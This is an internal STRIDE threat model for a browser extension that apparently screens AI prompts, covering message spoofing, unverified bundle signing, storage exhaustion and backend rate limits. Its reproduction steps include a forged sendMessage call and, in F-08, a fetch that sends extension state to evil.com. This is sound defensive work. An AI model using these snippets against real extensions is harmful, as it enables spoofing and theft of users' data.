# AegisGate Lens — Threat Model (STRIDE)

**Status**: Draft for Day 6-7 review.
**Version**: v0.1 (2026-06-22)
**Audience**: AegisGate Security internal; enterprise customers on request.
**Methodology**: STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege).

## Purpose

This document catalogs the threats the AegisGate Lens extension itself
faces. It is distinct from `LENS-MITRE-ATLAS-OWASP-MAPPING.md`, which
catalogs the threats the Lens **detects** in user prompts. Both are
needed; do not confuse them.

The goal is to enumerate realistic attack vectors, document the current
mitigation, and assign residual risk. Each finding has an action that
becomes a Day 8-10 deliverable in the 30-day plan.

## Scope

In-scope:

- The Lens extension source code in `src/`.
- The Lens bundle loading path (`util/bundle-loader.js`).
- The service worker (`src/service-worker.js`).
- `chrome.storage.local` and `chrome.storage.sync` usage.
- The wire protocol between content script, service worker, and backend.
- The chrome-extension:// origin and its `web_accessible_resources`.
- The Ed25519 bundle signing chain (`keys/lens-signing-private.pem`,
  `keys/lens-signing-public.pem`).

Out-of-scope (covered elsewhere):

- The detection logic itself (`src/detectors/`) — covered by
  `LENS-MITRE-ATLAS-OWASP-MAPPING.md`.
- The Lens backend (Go) — owned by the Platform monorepo; report to
  that repo's threat model.
- The browser's extension sandbox — owned by Chrome / Firefox.
- Third-party AI providers (ChatGPT, Claude, etc.) — they have their
  own threat models.

## Trust boundaries

```
+-----------------------------+         +-------------------------+
|  AI provider page (origin)  |  TSB-1  |  content script         |
|  e.g. https://chat.openai   |<------->|  (injected, isolated    |
|                             |         |   JS context)           |
+-----------------------------+         +-------------------------+
                                                  |
                                                  | chrome.runtime.
                                                  | sendMessage
                                                  v
                                       +-------------------------+
                                       |  service worker         |
                                       |  (chrome-extension://)  |
                                       +-------------------------+
                                                  |
                                                  | HTTPS (Bearer)
                                                  v
                                       +-------------------------+
                                       |  Lens backend           |
                                       |  lens.aegisgatesecurity |
                                       |  .io                    |
                                       +-------------------------+

  TSB-1: content script boundary. Page DOM is attacker-controlled.
  TSB-2: message-passing boundary. Sender.id not validated.
  TSB-3: network boundary. TLS 1.2+ only.
  TSB-4: backend trust boundary. Authenticated via bearer token.
```

## Findings

### F-01: Service worker accepts `chrome.runtime.onMessage` from any sender

**STRIDE category**: S (Spoofing), I (Information Disclosure), D (DoS),
E (Elevation of Privilege).

**Attack vector**: Any Chrome extension with `host_permissions` for our
extension pages OR any web page allowed by `externally_connectable` (we
don't set this — so only extensions with the matching IDs can connect;
but Chrome does allow same-ID connections from other components we
don't know about). A malicious extension can send:

- `{ type: 'lens.telemetry', event: <crafted> }` — fills the rate
  limit or sends attacker-controlled metadata.
- `{ type: 'lens.opt_in', payload: { enabled: true } }` — turns
  telemetry on without user consent.
- `{ type: 'lens.stats' }` — reads our local stats.

**Reproduction**:

```javascript
// From any page where the attacker can run JS (e.g. via XSS in a
// page the victim visits, or from a malicious extension):
chrome.runtime.sendMessage(
  'aegisgate-lens-extension-id',
  { type: 'lens.telemetry', event: { /* crafted */ } },
  () => {},
);
```

**Current mitigation**: The schema validator rejects events with
forbidden fields. The rate limit caps the damage at 100 events/min.
The privacy policy + Day 4 integration test cover the *content* of
events, not the *sender*.

**Residual risk**: Medium. A determined attacker with an installed
malicious extension can disable the privacy guarantee (turn telemetry
on without consent) and DoS the rate limit.

**Recommended action (Day 8-10)**:

In `src/service-worker.js`, validate `sender.id === chrome.runtime.id`
at the top of the `onMessage` listener. Reject otherwise. Add an
integration test (`test/security-sender-validation.test.mjs`) that
sends a message with a forged `sender.id` and asserts it is rejected.

**Severity**: CVSS 6.5 (Medium). Authenticated via installed malicious
extension; requires victim to install one.

### F-02: Bundle signing keys exist but are not wired into the load path

**STRIDE category**: T (Tampering).

**Attack vector**: If the ML bundle (`aegisgate-lens-transformer-v0.2.0.bundle`)
or regex bundle (`aegisgate-lens-v0.1.0.bundle`) is downloaded from a
mirror or modified in transit, the content script loads it as-is. A
tampered bundle could execute arbitrary JS inside our content-script
context — equivalent to RCE on every AI provider page we support.

**Reproduction**:

1. Set up a local mirror of `chrome.runtime.getURL('aegisgate-lens-v0.1.0.bundle')`.
2. Replace the bundle with one that contains `eval('alert(1)')` in its
   init.
3. Confirm the content script loads it without verification.

(Note: in MV3, `chrome.runtime.getURL` always returns the local
extension URL, so this attack requires write access to the extension's
files on disk — i.e., local-machine compromise. But during dev, the
bundle is served from `lens-final-dist/` which a malicious npm
dependency could replace.)

**Current mitigation**: The Ed25519 key pair exists at
`keys/lens-signing-private.pem` (private) and
`keys/lens-signing-public.pem` (public). The signature is computed at
build time. But: there is **no verification code** in
`util/bundle-loader.js`. The signature is generated but never checked.

**Residual risk**: Medium (during dev / build pipeline compromise).
Low in production (the Chrome Web Store re-signs bundles).

**Recommended action (Day 8-10)**:

In `util/bundle-loader.js`:

1. Read the public key from a string constant (NOT from the bundle
   itself).
2. After loading a bundle, verify its Ed25519 signature against the
   embedded signature manifest.
3. If verification fails, log a `[CRITICAL]` warning and refuse to
   initialize the engine.

**Severity**: CVSS 7.5 (High) during dev; CVSS 5.0 (Medium) in
production.

### F-03: Content script accepts input from attacker-controlled DOM

**STRIDE category**: T (Tampering), E (Elevation of Privilege).

**Attack vector**: A malicious page (or XSS in an AI provider page)
inserts text into the prompt field. The content script reads the
prompt field via `document.querySelector` and runs detection on it. A
sufficiently crafted prompt can:

- Trigger a high-TPR false positive to confuse the user.
- Trigger a low-TPR false negative to evade detection (the actual
  Lens attack surface).
- Cause the content script to log to the console (information leak
  via `console.warn`).

**Current mitigation**: Detectors are read-only. They do not mutate
the page or execute arbitrary JS. The schema allowlist prevents any
sensitive field from leaving the browser via telemetry.

**Residual risk**: Low. The Lens is **designed** to operate on
attacker-controlled input — that's the threat model of the user.

**Recommended action**: None. This is the intended threat surface.

**Severity**: N/A (intended).

### F-04: `chrome.storage.local` is unbounded for some keys

**STRIDE category**: D (Denial of Service).

**Attack vector**: The `dismissals` key in `chrome.storage.local`
stores one entry per dismissed detection, with 24h expiry. The
`lens.local_audit` key is capped at 1000 entries (`storage.js`). But
`dismissals` is not capped.

A page that triggers many distinct detections (e.g., pasting the
entire English dictionary into the prompt field) could fill
`chrome.storage.local` to the 10MB quota. When the quota is full,
`chrome.storage.local.set` rejects and dismissal tracking silently
fails.

**Reproduction**:

1. Visit an AI provider page.
2. Paste a large body of text containing many distinct "detection-shaped"
   strings.
3. Dismiss each as false positive.
4. Observe `chrome.storage.local.getBytesInUse('dismissals')` grow.

**Current mitigation**: `dismissals` have 24h expiry, but expired
entries are NOT pruned. The quota eventually fills.

**Residual risk**: Low. The quota is 10MB per extension, and the
Lens's storage is otherwise minimal.

**Recommended action (Day 8-10)**:

In `src/storage.js`, on every `appendLocalAudit` call, prune
expired dismissals from the same `dismissals` object. Add a unit
test that fills the dismissals key with 10000 expired entries and
asserts the next write prunes them.

**Severity**: CVSS 3.5 (Low).

### F-05: Backend has no IP-based rate limit; only client-side

**STRIDE category**: D (Denial of Service), T (Tampering).

**Attack vector**: A bot that obtains a valid bearer token (by
installing the extension) can send 100 events/minute per IP — but if
it uses many IPs (botnet) or many install IDs (re-install loop), it
can flood the backend. The backend has no IP-based rate limit
documented in this threat model.

**Reproduction**:

1. Install the extension.
2. Extract the bearer token from `chrome.storage.local` (XSS in any
   page the victim visits).
3. Send 10,000 events from 100,000 rotating IPs.

**Current mitigation**: Client-side rate limit (100/min per
installation). Bearer tokens are per-installation, not per-IP.

**Residual risk**: Medium for backend availability. Low for user
privacy (the schema allowlist prevents prompt content from being sent
even if the bearer token leaks).

**Recommended action (Day 8-10, deferred to backend owner)**:

In the Lens backend (Go, owned by Platform monorepo):

1. IP-based rate limit: 1000 events/hour per IP across all bearer
   tokens.
2. Bearer-token-per-IP rate limit: 100/min (same as client-side, but
   re-enforced server-side).
3. Anomaly detection: alert if any installation sends 10x its
   historical median.

**Severity**: CVSS 5.5 (Medium). Backend service only.

### F-06: Manifest CSP is strict but doesn't cover content scripts

**STRIDE category**: T (Tampering), E (Elevation of Privilege).

**Attack vector**: The `content_security_policy.extension_pages` in
`manifest.json` is `script-src 'self'; object-src 'self'`. This applies
to the extension popup, welcome page, and service worker. It does
NOT apply to content scripts.

In MV3, content scripts cannot use `eval()` or `new Function()`
regardless of CSP, because they run in an isolated world with
`eval()` always disabled. Inline `<script>` tags injected via
`document.createElement('script')` ARE blocked by default. But the
content script CAN inject inline scripts into the page (where they
run in the page's CSP context, not ours).

**Current mitigation**: No `eval()` or `new Function()` anywhere in
`src/`. No `innerHTML` use anywhere. All DOM updates use
`textContent` (verified by `grep -rn innerHTML src/` returning zero
hits on Day 6).

**Residual risk**: Low. The MV3 isolated world is the strongest
mitigation.

**Recommended action (Day 10)**:

1. Verify the absence of `eval`, `new Function`, `innerHTML` in CI.
2. Add a test (`test/security-csp.test.mjs`) that asserts no dynamic
   code execution in `src/`.
3. Document the CSP policy in `docs/CSP-POLICY.md`.

**Severity**: CVSS 2.0 (Low). Defense-in-depth.

### F-07: `web_accessible_resources` exposes bundles to AI provider pages

**STRIDE category**: I (Information Disclosure).

**Attack vector**: The `aegisgate-lens-v0.1.0.bundle` and
`aegisgate-lens-transformer-v0.2.0.bundle` files are listed in
`web_accessible_resources` for the AI provider hosts. This means the
AI provider page can `<script src="chrome-extension://.../bundle">` to
load our bundle and inspect its contents.

The bundles are model files (TFLite / ONNX), not source code, so
they don't reveal detection secrets. But they DO reveal:

- The exact model architecture (ONNX graph can be reconstructed).
- The model weights (which can be downloaded by anyone and used to
  craft adversarial examples).

**Current mitigation**: The bundles are publicly available from the
Chrome Web Store anyway. The `web_accessible_resources` exposure is
not new.

**Residual risk**: Low. Adversarial example extraction is a known
risk for any ML detector and is the trade-off for a transparent,
auditable model.

**Recommended action**: None. Document the risk in
`docs/MODEL-CARD.md`.

**Severity**: N/A (accepted trade-off).

### F-08: No sender-id validation on `chrome.runtime.sendMessage` from content script

**STRIDE category**: S (Spoofing).

**Attack vector**: A malicious page can run `chrome.runtime.sendMessage`
targeting our extension ID if it knows our extension ID. The public
extension ID is discoverable from the Chrome Web Store URL.

**Reproduction**:

```javascript
// In a malicious page:
chrome.runtime.sendMessage(
  '<our-extension-id>',
  { type: 'lens.get_state' },
  (response) => { /* exfiltrate */ fetch('https://evil.com/?s=' + JSON.stringify(response)); },
);
```

**Current mitigation**: `lens.get_state` returns the opt-in state
(public information). `lens.stats` returns the local count of
detections (not sensitive). `lens.opt_in` would let an attacker toggle
telemetry — this IS a finding (covered by F-01).

**Residual risk**: Same as F-01.

**Recommended action**: Addressed by F-01's fix.

**Severity**: Same as F-01.

### F-09: Opt-in state changes are not signed

**STRIDE category**: R (Repudiation).

**Attack vector**: If `chrome.storage.sync` is somehow tampered with
(via a compromised sync account or a malicious extension with the
`storage` permission reading our sync storage — actually, that's
blocked by Chrome's per-extension storage isolation), the user could
later claim they didn't opt in.

**Current mitigation**: `storage.js` records `last_changed_at` and
`lens_version` alongside the opt-in flag, so we can see when and from
what version the change happened.

**Residual risk**: Very low. Chrome's storage isolation makes this
hard to exploit.

**Recommended action**: None for now. If the Lens backend starts
trusting opt-in state, add a server-side log of opt-in changes
including the version and timestamp.

**Severity**: CVSS 1.5 (Low).

## Summary table

| ID | Category | Severity | Status | Action target |
|---|---|---|---|---|
| F-01 | S, I, D, E | Medium (6.5) | OPEN | Day 8 |
| F-02 | T | Medium-High (5.0-7.5) | OPEN | Day 8 |
| F-03 | T, E | N/A (intended) | — | — |
| F-04 | D | Low (3.5) | OPEN | Day 9 |
| F-05 | D, T | Medium (5.5) | OPEN | Day 9 (backend owner) |
| F-06 | T, E | Low (2.0) | OPEN | Day 10 |
| F-07 | I | N/A (accepted) | — | — |
| F-08 | S | Same as F-01 | — | Day 8 |
| F-09 | R | Low (1.5) | — | — |

## Action plan (Day 8-10)

Day 8: Add `sender.id` validation to the service worker (F-01, F-08).
Wire Ed25519 bundle verification into `util/bundle-loader.js` (F-02).

Day 9: Add `dismissals` pruning to `storage.js` (F-04). File the
backend rate-limit issue in the Platform monorepo (F-05).

Day 10: Add `test/security-csp.test.mjs` that asserts no
`eval`/`new Function`/`innerHTML` in `src/` (F-06).

## References

- STRIDE: https://en.wikipedia.org/wiki/STRIDE_(security)
- MITRE ATLAS mapping: `plans/LENS-MITRE-ATLAS-OWASP-MAPPING.md`
- Model card: `plans/LENS-MODEL-CARD.md`
- Privacy policy: `docs/PRIVACY-POLICY.md`
- Bundle signing keys: `keys/lens-signing-{private,public}.pem`
